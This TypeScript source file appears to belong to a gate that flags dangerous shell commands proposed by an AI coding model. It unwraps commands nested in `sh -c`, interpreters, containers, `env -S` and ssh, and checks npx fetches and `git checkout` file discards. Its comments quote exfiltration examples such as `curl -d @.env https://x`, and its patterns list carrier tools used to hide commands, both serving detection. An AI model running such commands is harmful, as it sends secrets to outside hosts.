// (#794).
function envWord(rest: string): { value: string; end: number } | undefined {
  const lead = /^\s*/.exec(rest)![0].length;
  SHELL_WORD_RE.lastIndex = lead;
  const m = SHELL_WORD_RE.exec(rest);
  return m ? { value: m[0], end: SHELL_WORD_RE.lastIndex } : undefined;
}

// Carriers that hand a command string to something else to run. Every pattern above matches the
// literal command text, which is why most of them already see through quotes — but the
// verb-position patterns are anchored per segment, so `sh -c "curl -d @.env https://x"` reads as
// a segment starting with `sh` and the fetch goes unseen. Extracting the body and re-running
// detection on it is what makes that coverage structural instead of a coincidence of the
// argument text. Heredocs need no carrier: their body lands on its own line, and verbLabels
// already splits on newlines.
const SHELL_C_RE = /\b(?:sh|bash|zsh|dash|ksh)\s+(?:-[\w-]+\s+)*-c(?![\w-])/g;
const INTERPRETER_C_RE =
  /\b(python[\d.]*|ruby|perl|node|deno|php)\s+(?:-[\w-]+\s+)*(-[ce])(?![\w-])/g;
const CONTAINER_EXEC_RE = /\b(kubectl|oc|docker|podman)\s+(?:exec|run)\b[^\n]*?\s--(?=\s)/g;
// `env -S 'curl https://x'` reads its value as the whole argument list of the command it runs, so the
// value is a program of its own exactly as a shell's `-c` argument is (#794). A WORD WALK rather than
// a pattern for the prefix: `env` accepts options and assignments in any order (`env FOO=1 -S …`,
// `env --unset=PATH -S …`), and a regex that also tolerated a quoted value in one of them would
// backtrack on the space inside it — the reason the quote-aware token pattern is rejected above.
// `-S` is in the strip's value table too, so without this the value would be skipped in silence, the
// one direction this file does not take.
const ENV_LEAD_RE = /\benv(?![\w./-])/g;
const ENV_SPLIT_FLAGS = new Set(['-S', '--split-string']);
const ENV_VALUE_FLAGS = new Set(['-u', '-C', '-P', '--unset', '--chdir', '--path']);
const ENV_SHORT_VALUE_LETTERS = new Set(['u', 'C', 'P', 'S']);
// The assignment arm keeps its bare `\S*` where the verb reader went to a lexer (#752), and the
// trailing `ssh` is why: a quoted value has two viable ends (up to the space, or at the closing
// `"`) and an `ssh` that fails to appear makes the engine re-explore every earlier token's choice.
// What a miss costs here is the `via ssh:` detail only: `stripVerbPrefix` still puts `ssh` itself
// in verb position, so the remote command prompts as remote host access.
const SSH_LEAD_RE =
  /(?:^|[\n;&|`(])\s*(?:(?:[A-Za-z_]\w*=\S*|sudo|command|nohup|env|time)\s+)*ssh(?![\w./-])/g;

const MAX_NESTED_BODIES = 8;

function nestedBodies(command: string): Array<{ context: string; body: string; interp: boolean }> {
  const found: Array<{ context: string; body: string; interp: boolean }> = [];
  const push = (context: string, body: string, interp: boolean) => {
    const trimmed = body.trim();
    if (trimmed && trimmed !== command.trim() && found.length < MAX_NESTED_BODIES) {
      found.push({ context, body: trimmed, interp });
    }
  };

  for (const m of command.matchAll(SHELL_C_RE)) {
    const w = readWord(command.slice(m.index + m[0].length));
    if (w) push(`${m[0].trim().split(/\s+/)[0]} -c`, w.value, false);
  }
  for (const m of command.matchAll(INTERPRETER_C_RE)) {
    const w = readWord(command.slice(m.index + m[0].length));
    if (w) push(`${m[1]} ${m[2]}`, w.value, true);
  }
  // Everything after the `--` is the command run inside the container or pod.
  for (const m of command.matchAll(CONTAINER_EXEC_RE)) {
    push(`${m[1]} exec`, command.slice(m.index + m[0].length), false);
  }
  // A walk rather than one `readWord`, because `env` takes its options and its `VAR=value` operands
  // in any order. The words come off `SHELL_WORD_RE` — the strip's own reader — so a quoted value
  // holding a space (`env FOO="a b" -S …`) is one word and the `-S` behind it is reachable.
  for (const m of command.matchAll(ENV_LEAD_RE)) {
    let rest = command.slice(m.index + m[0].length);
    for (;;) {
      const w = envWord(rest);
      if (!w) break;
      const raw = rest.slice(0, w.end);
      rest = rest.slice(w.end);
      const word = dequote(w.value);
      if (ENV_SPLIT_FLAGS.has(word)) {
        const body = readWord(rest);
        if (body) push('env -S', body.value, false);
        break;
      }
      const attached = '--split-string=';
      if (word.startsWith(attached)) {
        // The value is read off the RAW word after the `=`, since `word` has it dequoted and
        // `readWord` knows how to unwrap the quotes it may still be wearing.
        const body = readWord(raw.slice(raw.indexOf('=') + 1));
        if (body) push('env -S', body.value, false);
        break;
      }
      // Anything `env` runs a command with has to be an option or a `VAR=value`; the first other
      // word is that command, and it is not a split string.
      if (!word.startsWith('-') && !ENV_ASSIGN_WORD_RE.test(word)) break;
      // A short bundle, read as getopt reads it (see `wrapperOptionValue`): the first value-taking
      // letter takes the rest of the word, or the next word when it is last. `-iS "curl …"` and
      // `-S'curl …'` are both a split string, and skipping them would hide the command (#843 review).
      const bundle = /^-[a-zA-Z]/.test(w.value) && !w.value.startsWith('--') ? w.value : '';
      const at = [...bundle].findIndex((c, i) => i > 0 && ENV_SHORT_VALUE_LETTERS.has(c));
      if (at > 0) {
        const attachedValue = at < bundle.length - 1;
        if (bundle[at] === 'S') {
          const body = attachedValue ? readWord(bundle.slice(at + 1)) : readWord(rest);
          if (body) push('env -S', body.value, false);
          break;
        }
        if (!attachedValue) {
          const arg = envWord(rest);
          if (!arg) break;
          rest = rest.slice(arg.end);
        }
        continue;
      }
      if (ENV_VALUE_FLAGS.has(word)) {
        const arg = envWord(rest);
        if (!arg) break;
        rest = rest.slice(arg.end);
      }
    }
  }
  // `ssh [flags] host <command…>`: skip the flags and their arguments, skip the host, and the
  // rest is what runs on the far side — quoted as one word or spelled out as several.
  for (const m of command.matchAll(SSH_LEAD_RE)) {
    let rest = command.slice(m.index + m[0].length);
    let word = readWord(rest);
    while (word && word.value.startsWith('-')) {
      rest = rest.slice(word.end);
      if (SSH_ARG_FLAGS.has(word.value)) {
        const arg = readWord(rest);
        if (!arg) break;
        rest = rest.slice(arg.end);
      }
      word = readWord(rest);
    }
    if (!word) continue;
    rest = rest.slice(word.end);
    const body = readWord(rest);
    // A single quoted argument is the whole remote command; otherwise take the rest verbatim.
    push('ssh', body && body.end >= rest.trimEnd().length ? body.value : rest, false);
  }
  return found;
}

// Two checks read the working tree, because the command text alone cannot answer them: whether
// `npx vitest` fetches anything, and whether `git checkout App.tsx` names a branch or a file.
// Without a cwd both fall back to the text — npx flags, checkout stays with the regexes above.

// Each segment with the directory it runs in, leading `cd` hops applied.
function* segmentsWithDir(
  command: string,
  cwd: string,
): Generator<{ dir: string; words: string[] }> {
  const stripped = stripHeredocs(command);
  let dir = cwd;
  for (const raw of splitSegments(stripped, maskQuoted(stripped))) {
    const ws = words(raw.trim());
    if (ws[0] === 'cd') {
      if (ws[1]) dir = resolve(dir, expandHome(ws[1]));
      continue;
    }
    yield { dir, words: ws };
  }
}

function expandHome(path: string): string {
  return path === '~' || path.startsWith('~/') ? homedir() + path.slice(1) : path;
}

// npx and bunx run a binary the project already installed without touching the registry, and that
// is most of what a model runs through them (`npx vitest run`, `npx tsc --noEmit`: 188 of 267
// flags across a real session history). Flagging those trained exactly the reflexive approval the
// gate cannot afford. Anything that could fetch still flags: a flag asking for a package, a
// versioned or scoped name, a name with no local binary — and an occurrence the word scan could
// not account for (quoted, heredoc'd), which is why the counts must agree.
const NPX_RE = /\b(?:npx|bunx)(?![\w./-])/g;
const NPX_FETCH_FLAG_RE = /^(?:-y|--yes|-p|--package|-c|--call)(?:=|$)/;

function remoteExecLabel(command: string, cwd: string | undefined): string | undefined {
  const expected = command.match(NPX_RE)?.length ?? 0;
  if (expected === 0) return undefined;
  if (!cwd) return REMOTE_EXEC_LABEL;
  let local = 0;
  for (const { dir, words } of segmentsWithDir(command, cwd)) {
    const at = words.findIndex(w => w === 'npx' || w === 'bunx');
    if (at < 0) continue;
    if (!runsLocalBin(words.slice(at + 1), dir)) return REMOTE_EXEC_LABEL;
    local++;
  }
  return local === expected ? undefined : REMOTE_EXEC_LABEL;
}

function runsLocalBin(args: string[], dir: string): boolean {
  for (const a of args) {
    if (a.startsWith('-')) {
      if (NPX_FETCH_FLAG_RE.test(a)) return false;
      continue;
    }
    if (/[@/\\$]/.test(a)) return false;
    return hasLocalBin(dir, a);
  }
  return false;
}

// npm exec resolves a project binary from the nearest node_modules/.bin walking up.
function hasLocalBin(dir: string, bin: string): boolean {
  for (let d = dir; ; d = dirname(d)) {
    if (existsSync(join(d, 'node_modules', '.bin', bin))) return true;
    if (dirname(d) === d) return false;
  }
}

// `git checkout App.tsx` discards the file's uncommitted edits exactly like the `--` form above,
// and it ran unprompted in a real session. Only the tree can tell it from `git checkout main`: an
// operand that exists as a path and does not resolve as a commit is a pathspec. A branch that
// exists only on a remote (checkout's DWIM create) reads as a path and prompts once — the safe
// side of the ambiguity.
const CHECKOUT_BRANCH_FLAGS = new Set(['-b', '-B', '--orphan']);
const CHECKOUT_LABEL = 'Discard working-tree changes (git checkout -- <path>)';

function checkoutPathLabel(command: string, cwd: string | undefined): string | undefined {
  if (!cwd || !/\bgit\b[^&;|]*\bcheckout\b/.test(command)) return undefined;
  for (const { dir, words } of segmentsWithDir(command, cwd)) {
    const g = words.indexOf('git');
    if (g < 0) continue;
    let d = dir;
    let i = g + 1;
    for (; i < words.length && words[i].startsWith('-'); i++) {
      if (words[i] === '-C' && words[i + 1]) d = resolve(d, expandHome(words[++i]));
      else if (words[i] === '-c') i++;
    }
    if (words[i] !== 'checkout') continue;
    const args = words.slice(i + 1);
    if (args.some(a => CHECKOUT_BRANCH_FLAGS.has(a))) continue;
    for (const a of args) {
      if (a.startsWith('-') || !existsSync(resolve(d, a))) continue;
      if (!resolvesAsCommit(a, d)) return CHECKOUT_LABEL;
    }
  }
  return undefined;
}

function resolvesAsCommit(name: string, dir: string): boolean {
  try {
    execFileSync('git', ['rev-parse', '--verify', '--quiet', `${name}^{commit}`], {
      cwd: dir,
      stdio: 'ignore',
      timeout: 2000,
    });
    return true;
  } catch {
    return false;
  }
}

// `cwd` is the directory the command runs in; without it the two working-tree checks above fall
// back to what the text alone can say.
export function detectDangerousPatterns(command: string, cwd?: string): string[] {
  return detectAtDepth(command, 0, cwd);
}

function detectAtDepth(rawCommand: string, depth: number, cwd: string | undefined): string[] {
  // Every pattern below matches the literal command text, which is what makes them hard to fool —
  // and why they fire on prose that is only ever going to be read. Markdown the command is writing
  // (`cat > CHANGELOG.md`, a `gh pr create --body`) is blanked first, length- and newline-preserving,
  // so the scan runs unchanged on everything that could still execute (#644). What it keeps is the
  // substitutions inside that text, which the shell does run.
  const command = maskMarkdownData(rawCommand);
  const hits: string[] = [];
  for (const { re, label } of DANGER_PATTERNS) {
    if (re.test(command) && !hits.includes(label)) hits.push(label);
  }
  // A shell's `-c` program pastes nothing: a heredoc there can be a `$(cat <<'EOF' …)` whose
  // output IS the program, and the shell that runs it was named one level up, out of sight here.
  // The two per-segment readers below want the same strips, and each one is a walk, so they are read
  // once here and handed to both (#794).
  const reads = segmentReads(verbSegments(command, depth === 0));
  for (const label of [
    ...verbLabels(reads),
    remoteExecLabel(command, cwd),
    checkoutPathLabel(command, cwd),
  ]) {
    if (label && !hits.includes(label)) hits.push(label);
  }
  // The long-tail fallback only speaks up when nothing more specific did, so a `pip install`
  // reports one precise label instead of two overlapping ones. Every install/uninstall label
  // above contains the word, which is what makes this cheap test sufficient.
  if (!hits.some(h => /install/i.test(h))) {
    const generic = genericPackageLabel(reads);
    if (generic) hits.push(generic);
  }
  // One level of recursion only: a model confused enough to nest two carriers is not the case
  // this defends against, and each level costs precision. A label the outer command already
  // reported is not repeated with a prefix — most patterns here match the literal text, so the
  // prefixed form is signal only when the outer pass genuinely could not see it.
  if (depth === 0) {
    for (const { context, body, interp } of nestedBodies(command)) {
      const inner = detectAtDepth(body, 1, cwd);
      if (interp) {
        for (const { re, label } of INTERPRETER_BODY_PATTERNS) {
          if (re.test(body) && !inner.includes(label)) inner.push(label);
        }
      }
      for (const label of inner) {
        const prefixed = `via ${context}: ${label}`;
        if (!hits.includes(label) && !hits.includes(prefixed)) hits.push(prefixed);
      }
    }
  }
  return hits;
}
